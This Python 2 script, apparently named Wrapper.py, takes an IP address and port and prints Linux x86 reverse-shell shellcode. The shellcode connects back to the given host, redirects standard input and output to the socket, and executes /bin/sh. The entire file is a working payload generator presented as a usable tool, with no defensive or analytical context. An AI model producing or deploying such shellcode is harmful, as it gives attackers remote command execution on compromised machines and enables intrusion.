#!/usr/bin/python

import sys

if len(sys.argv) !=3:
	print "Incorrect usage. Use: python Wrapper.py <IP> Port number."
	print "ex. python Wrapper.py 192.168.12.40 1234"
	exit()
try:
	ip   = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "Incorrect usage. Use: python Wrapper.py <IP> <Port>"
        print "ex. python Wrapper.py 192.168.12.40 1234"
	exit()
	
if port not in range(1025,65536):
	print ("Invalid port. Please select a port higher that 1024" +
	       "(as Root privileges are required) and lower than 65536(as it is an Invalid port).")
	exit()

def toHex(n):  
	hexVal = hex(int(n))[2:] 
	if hexVal == "0":
		print "IP address has null bytes."
		exit()
	if len(hexVal) == 1:
        	hexVal = "0" + hexVal
	hexVal = "\\x" + hexVal	
	return hexVal 

addr = ""
for i in range(0,4):
	addr = addr + toHex(ip.split(".",3)[i])

portInHex = hex(port)[2:]

if len(portInHex) < 4:
	portInHex = "0" + portInHex 

if portInHex[0:2] == "00" or portInHex[2:4] == "00":
	print "Port number has null bytes."
	exit()                		       

newPort = "\\x" + portInHex[0:2] + "\\x" + portInHex[2:4]

shellcode = ("\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\xb3\\x01\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x68" + addr + "\\x66\\x68" + newPort + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x03\\xb0\\x66\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf7\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")

print shellcode 
